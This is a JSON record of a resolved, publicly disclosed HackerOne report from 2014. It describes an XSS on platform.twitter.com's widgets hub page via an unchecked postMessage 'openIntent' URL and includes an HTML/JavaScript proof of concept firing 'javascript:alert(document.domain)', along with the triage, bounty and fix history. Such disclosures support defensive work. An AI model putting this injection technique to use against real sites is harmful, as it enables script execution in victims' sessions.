{"id":29328,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTMyOA==","url":"https://hackerone.com/reports/29328","title":"XSS platform.twitter.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-09-28T18:18:12.595Z","submitted_at":"2014-09-28T18:18:12.595Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"batram","url":"/batram","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/745/fe0be3754f6ee49fc3bf161d20641ce917cde595_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-11-17T14:30:52.825Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2014-10-06T21:14:03.265Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Since you have fixed a few problems with the FlashTransport on platform.twitter.com already,\r\nI though I would also take a look at the JavaScript around it.\r\n\r\n_Problem URL:_\r\nhttps://platform.twitter.com/widgets/hub.html\r\n\r\n__Description:__\r\nThe mentioned page opens URLs send to it via postMessage or FlashTransport without checking for an 'javascript:'-prefix, resulting in XSS on platform.twitter.com. Since the URL gets open in a popup, popups need to be allowed or the opening a result of user interaction. \r\n\r\n__PoC:__\r\n\r\n    \u003ciframe src=\"https://platform.twitter.com/widgets/hub.html\" id=\"iframe\"\u003e\u003c/iframe\u003e\r\n\r\n    \u003cscript\u003e\r\n      var win = document.getElementById(\"iframe\").contentWindow\r\n\r\n      function fire() {\r\n        win.postMessage(\r\n          '{\"id\": 12, \"method\": \"openIntent\", \"params\":[\"javascript:alert(document.domain)\"]}',\r\n          \"https://platform.twitter.com/\" \r\n        )\r\n      }\r\n\r\n      function listener(e){\r\n        console.log(e.data);\r\n        if(e.data == '__ready__')\r\n          fire();\r\n      }\r\n\r\n      if (window.addEventListener){\r\n        addEventListener(\"message\", listener, false)\r\n      } else {\r\n        attachEvent(\"onmessage\", listener)\r\n      }\r\n    \u003c/script\u003e\r\n\r\n\r\nTested in:\r\n Win 8.1 | Google Chrome | Version 39.0.2166.2 dev-m (64-bit)\r\n","vulnerability_information_html":"\u003cp\u003eSince you have fixed a few problems with the FlashTransport on platform.twitter.com already,\u003cbr\u003e\nI though I would also take a look at the JavaScript around it.\u003c/p\u003e\n\n\u003cp\u003e\u003cu\u003eProblem URL:\u003c/u\u003e\u003cbr\u003e\n\u003ca title=\"https://platform.twitter.com/widgets/hub.html\" href=\"/redirect?url=https%3A%2F%2Fplatform.twitter.com%2Fwidgets%2Fhub.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://platform.twitter.com/widgets/hub.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003cbr\u003e\nThe mentioned page opens URLs send to it via postMessage or FlashTransport without checking for an \u0026#39;javascript:\u0026#39;-prefix, resulting in XSS on platform.twitter.com. Since the URL gets open in a popup, popups need to be allowed or the opening a result of user interaction. \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoC:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;iframe src=\u0026quot;https://platform.twitter.com/widgets/hub.html\u0026quot; id=\u0026quot;iframe\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\n\n\u0026lt;script\u0026gt;\n  var win = document.getElementById(\u0026quot;iframe\u0026quot;).contentWindow\n\n  function fire() {\n    win.postMessage(\n      \u0026#39;{\u0026quot;id\u0026quot;: 12, \u0026quot;method\u0026quot;: \u0026quot;openIntent\u0026quot;, \u0026quot;params\u0026quot;:[\u0026quot;javascript:alert(document.domain)\u0026quot;]}\u0026#39;,\n      \u0026quot;https://platform.twitter.com/\u0026quot; \n    )\n  }\n\n  function listener(e){\n    console.log(e.data);\n    if(e.data == \u0026#39;__ready__\u0026#39;)\n      fire();\n  }\n\n  if (window.addEventListener){\n    addEventListener(\u0026quot;message\u0026quot;, listener, false)\n  } else {\n    attachEvent(\u0026quot;onmessage\u0026quot;, listener)\n  }\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTested in:\u003cbr\u003e\n Win 8.1 | Google Chrome | Version 39.0.2166.2 dev-m (64-bit)\u003c/p\u003e\n","bounty_amount":"1120.0","formatted_bounty":"$1,120","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-11-05T22:14:03.617Z","allow_singular_disclosure_after":-193993921.9754719,"singular_disclosure_allowed":true,"vote_count":1,"voters":["nytr0gen"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":133687,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-09-29T18:35:02.791Z","updated_at":"2014-09-29T18:35:02.791Z","actor":{"username":"mfinifter","cleared":false,"url":"/mfinifter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":136053,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","markdown_message":"\u003cp\u003eThanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-04T03:41:35.431Z","updated_at":"2014-10-04T03:41:35.431Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"1120.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"batram","url":"/batram"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":137265,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-06T20:11:42.022Z","updated_at":"2014-10-06T20:11:42.022Z","actor":{"username":"mfinifter","cleared":false,"url":"/mfinifter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"batram","url":"/batram"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":137302,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hm, js-beautify kind of stumbles over the new code, so it is not really a pleasure to read.\nI guess with the regex-check in place the problem should be fixed.","markdown_message":"\u003cp\u003eHm, js-beautify kind of stumbles over the new code, so it is not really a pleasure to read.\u003cbr\u003e\nI guess with the regex-check in place the problem should be fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-06T20:45:37.822Z","updated_at":"2014-10-06T20:45:37.822Z","actor":{"username":"batram","cleared":false,"url":"/batram","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/745/fe0be3754f6ee49fc3bf161d20641ce917cde595_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":137346,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"We are requesting public disclosure to encourage other white hats to submit quality reports like yours. Thanks again.","markdown_message":"\u003cp\u003eWe are requesting public disclosure to encourage other white hats to submit quality reports like yours. Thanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-06T21:14:03.279Z","updated_at":"2014-10-06T21:14:03.279Z","first_to_agree":true,"actor":{"username":"mfinifter","cleared":false,"url":"/mfinifter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":161990,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-11-17T14:30:52.834Z","updated_at":"2014-11-17T14:30:52.834Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}